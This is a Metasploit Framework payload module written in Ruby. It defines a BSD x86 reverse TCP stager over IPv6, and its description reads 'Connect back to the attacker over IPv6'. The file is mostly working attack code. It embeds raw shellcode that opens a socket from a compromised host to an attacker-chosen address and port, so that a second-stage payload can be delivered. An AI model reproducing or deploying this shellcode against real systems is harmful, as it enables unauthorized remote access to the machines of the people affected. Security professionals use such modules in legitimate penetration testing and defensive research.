##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# BSD reverse TCP stager.
#
###
module Metasploit3

	include Msf::Payload::Stager


	def self.handler_type_alias
		"reverse_ipv6_tcp"
	end

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager (IPv6)',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to the attacker over IPv6',
			'Author'        =>  ['skape', 'vlad902', 'hdm'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 43, 'ADDR6' ],
							'LPORT'    => [ 36, 'n'    ],
							'SCOPEID'  => [ 59, 'V'    ]
						},
					'Payload' =>
						"\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\xeb\x0e\x59" +
						"\x6a\x1c\x51\x50\x97\x6a\x62\x58\x50\xcd\x80\xeb\x21\xe8\xed\xff" +
						"\xff\xff\x1c\x1c\xbf\xbf\x00\x00\x00\x00\x40\x41\x42\x43\x45\x46" +
						"\x47\x48\x49\x4a\x4b\x4d\x4e\x4f\x50\x51\x00\x00\x00\x00\xb0\x03" +
						"\xc6\x41\xfd\x10\xcd\x80\xc3"
				}
			))
		register_options([
			OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
		])				
	end

end
